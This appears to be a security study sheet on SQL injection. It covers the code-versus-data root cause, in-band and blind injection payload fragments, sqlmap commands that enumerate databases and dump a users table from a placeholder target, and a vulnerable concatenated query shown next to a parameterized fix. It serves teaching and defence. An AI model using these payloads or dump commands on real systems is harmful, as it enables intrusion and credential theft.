1 · The One Idea

The universal vulnerability behind all injection flaws (SQL Injection, OS Command Injection, LDAP Injection) is the failure to separate code from data. When an application concatenates untrusted user input directly into an interpreter string, an attacker crafts malicious syntax that breaks out of the data context and instructs the database or operating system to execute arbitrary unauthorized commands.

3 · Types of SQL Injection

CategoryTechniqueHow It Works
In-Band SQLi UNION-based Appends results of attacker query to original query using UNION SELECT username, password FROM users--.
In-Band SQLi Error-based Intentionally triggers database error messages (e.g. CAST(version() AS int)) that leak sensitive data inside error strings.
Inferential (Blind) Boolean Blind No data or errors returned on screen. Attacker injects TRUE/FALSE conditions (AND SUBSTRING(password,1,1)='a') and observes page content differences.
Inferential (Blind) Time-based Blind Forces database to sleep (pg_sleep(5) or WAITFOR DELAY '0:0:5'). If server takes 5 seconds to respond, injected character was correct!

4 · Automated Database Exploitation with Sqlmap

# 1. Test a target URL parameter for SQL injection vulnerabilities
sqlmap -u "http://target.com/product.php?id=10" --banner

# 2. Enumerate all databases on the backend server
sqlmap -u "http://target.com/product.php?id=10" --dbs

# 3. Dump the users table from database 'corp_db'
sqlmap -u "http://target.com/product.php?id=10" -D corp_db -T users --dump

# 4. Inject using a captured HTTP POST request from Burp Suite
sqlmap -r login_request.req -p username --batch

5 · Complete Defense: Parameterized Queries (Prepared Statements)

Why Sanitization Fails and Prepared Statements Succeed

Trying to blacklist characters (', ", --) is doomed to fail due to encoding bypasses (Unicode, hex, double URL encoding). Prepared Statements compile the SQL query template on the database engine FIRST, and send user input separately as literal data parameters. The database parser treats user input strictly as a string constant, making injection mathematically impossible!

# VULNERABLE CODE (String Concatenation):
cursor.execute(f"SELECT * FROM users WHERE username = '{user}' AND password = '{pwd}'")

# SECURE CODE (Parameterized Query):
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user, pwd))
